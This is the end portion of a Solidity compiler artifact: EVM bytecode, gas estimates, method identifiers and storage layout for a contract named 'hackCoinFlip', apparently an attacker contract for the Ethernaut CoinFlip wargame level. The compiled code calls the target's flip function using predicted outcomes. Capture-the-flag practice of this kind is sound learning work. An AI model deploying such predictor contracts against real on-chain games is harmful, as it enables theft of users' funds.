ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x159 SWAP2 SWAP1 PUSH2 0x438 JUMP JUMPDEST POP PUSH2 0x1FE JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP6 ISZERO PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1B9 SWAP2 SWAP1 PUSH2 0x408 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1D8 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1FC SWAP2 SWAP1 PUSH2 0x438 JUMP JUMPDEST POP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x242 DUP2 PUSH2 0x22D JUMP JUMPDEST DUP2 EQ PUSH2 0x24D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x25F DUP2 PUSH2 0x239 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x27B JUMPI PUSH2 0x27A PUSH2 0x228 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x289 DUP5 DUP3 DUP6 ADD PUSH2 0x250 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2D7 PUSH2 0x2D2 PUSH2 0x2CD DUP5 PUSH2 0x292 JUMP JUMPDEST PUSH2 0x2B2 JUMP JUMPDEST PUSH2 0x292 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2E9 DUP3 PUSH2 0x2BC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2FB DUP3 PUSH2 0x2DE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x30B DUP2 PUSH2 0x2F0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x326 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x302 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x370 DUP3 PUSH2 0x32C JUMP JUMPDEST SWAP2 POP PUSH2 0x37B DUP4 PUSH2 0x32C JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x38E JUMPI PUSH2 0x38D PUSH2 0x336 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x3D3 DUP3 PUSH2 0x32C JUMP JUMPDEST SWAP2 POP PUSH2 0x3DE DUP4 PUSH2 0x32C JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x3EE JUMPI PUSH2 0x3ED PUSH2 0x399 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x402 DUP2 PUSH2 0x22D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x41D PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x3F9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x432 DUP2 PUSH2 0x239 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x44E JUMPI PUSH2 0x44D PUSH2 0x228 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x45C DUP5 DUP3 DUP6 ADD PUSH2 0x423 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DIFFICULTY SMOD DUP15 DUP8 XOR PUSH20 0x1871298E49F5F8D049073039ABA28F7D14AB74F 0xDB 0x4E CALLVALUE 0xAA LOG1 JUMPDEST PUSH5 0x736F6C6343 STOP ADDMOD 0xD STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "235800",
						"executionCost": "46648",
						"totalCost": "282448"
					},
					"external": {
						"hackFlip(bool)": "infinite",
						"originalContract()": "infinite"
					}
				},
				"methodIdentifiers": {
					"hackFlip(bool)": "367dea34",
					"originalContract()": "e2c345e2"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 15,
						"contract": "contracts/3_CoinFlip.sol:hackCoinFlip",
						"label": "originalContract",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(ICoinFlip)9"
					},
					{
						"astId": 18,
						"contract": "contracts/3_CoinFlip.sol:hackCoinFlip",
						"label": "FACTOR",
						"offset": 0,
						"slot": "1",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_contract(ICoinFlip)9": {
						"encoding": "inplace",
						"label": "contract ICoinFlip",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}